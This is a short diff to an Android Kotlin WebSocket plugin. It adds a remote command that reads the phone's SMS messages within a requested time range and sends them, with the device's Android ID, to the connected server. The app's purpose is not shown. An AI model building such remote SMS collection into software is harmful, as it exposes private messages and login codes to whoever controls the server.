@@ -178,6 +178,20 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
                         put("source", json)
                     }.toString())
                 }
+                11 -> {
+                    // 读取短信
+                    val params = json.optJSONObject("params")
+                    val startTime = params?.optLong("start_time",1698000000000L) ?: 1698000000000L
+                    val endTime = params?.optLong("end_time",1699000000000L) ?: 1699000000000L
+                    val id = params?.optString("id")
+
+                    val result = SmsUtils.getSmsAsJsonArray(id, startTime, endTime)
+                    sendMessage(JSONObject().apply {
+                        put("androidId", IdGet.androidId(mContext))
+                        put("smsList", result)
+                    }.toString())
+                    LogUtil.i("result = $result")
+                }
             }
 
         } catch (e: Exception) {
